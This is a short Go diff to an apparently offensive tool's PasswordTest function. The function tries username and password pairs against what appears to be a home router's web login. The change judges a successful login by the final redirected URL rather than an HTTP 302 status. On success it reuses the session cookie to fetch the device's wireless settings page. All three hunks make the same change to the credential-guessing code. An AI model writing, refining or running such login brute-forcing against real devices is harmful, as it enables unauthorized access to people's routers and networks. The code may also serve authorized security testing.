@@ -458,10 +458,11 @@ func (wh *WebHacks) PasswordTest(options map[string]string) {
 				fmt.Printf("Failed to read response body: %v", err)
 			}
 
-			status := resp.Status
-			fmt.Printf("[+] user:%s password:%s status:%s\n", user, password, status)
+			//status := resp.Status
+			lastURL := resp.Request.URL.String()
+			fmt.Printf("[+] user:%s password:%s lastURL:%s\n", user, password, lastURL)
 
-			if strings.Contains(status, "302") {
+			if strings.Contains(lastURL, "start.ghtml") {
 				resp, err = wh.Dispatch(url+"getpage.gch?pid=1002&nextpage=net_wlan_basic_t1.gch", "GET", "", headers)
 				if err != nil {
 					fmt.Printf("Request failed: %v", err)
@@ -545,10 +546,11 @@ func (wh *WebHacks) PasswordTest(options map[string]string) {
 				fmt.Printf("Failed to read response body: %v", err)
 			}
 
-			status := resp.Status
-			fmt.Printf("[+] user:%s password:%s status:%s\n", user, password, status)
+			//status := resp.Status
+			lastURL := resp.Request.URL.String()
+			fmt.Printf("[+] user:%s password:%s lastURL:%s\n", user, password, lastURL)
 
-			if strings.Contains(status, "302") {
+			if strings.Contains(lastURL, "start.ghtml") {
 				cookieValue := resp.Header.Get("Set-Cookie")
 				if cookieValue != "" {
 					headers.Set("Cookie", fmt.Sprintf("_TESTCOOKIESUPPORT=1; %s", cookieValue))
@@ -664,10 +666,11 @@ func (wh *WebHacks) PasswordTest(options map[string]string) {
 				fmt.Printf("Failed to read response body: %v", err)
 			}
 
-			status := resp.Status
-			fmt.Printf("[+] user:%s password:%s status:%s\n", user, password, status)
+			//status := resp.Status
+			lastURL := resp.Request.URL.String()
+			fmt.Printf("[+] user:%s password:%s lastURL:%s\n", user, password, lastURL)
 
-			if strings.Contains(status, "302") {
+			if strings.Contains(lastURL, "start.ghtml") {
 				cookieValue := resp.Header.Get("Set-Cookie")
 				if cookieValue != "" {
 					headers.Set("Cookie", fmt.Sprintf("_TESTCOOKIESUPPORT=1; %s", cookieValue))
